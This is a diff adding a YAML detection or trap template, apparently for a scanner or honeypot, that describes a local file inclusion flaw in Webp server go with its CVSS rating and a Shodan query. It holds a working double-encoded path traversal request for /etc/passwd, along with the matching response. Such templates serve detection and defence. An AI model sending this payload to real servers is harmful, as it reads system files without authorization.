@@ -1,0 +1,27 @@
+id: webp-server-go-lfi
+info:
+  name: Webp server go - Local File Inclusion
+  author: pikpikcu
+  description: Webp server go is vulnerable to local file inclusion.
+  severity: high
+  reference:
+  - https://github.com/webp-sh/webp_server_go/issues/92
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: http.html:"Webp"
+  tags: lfi,webp
+traps:
+- request:
+    method: GET
+    path: /%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: root:.*:0:0
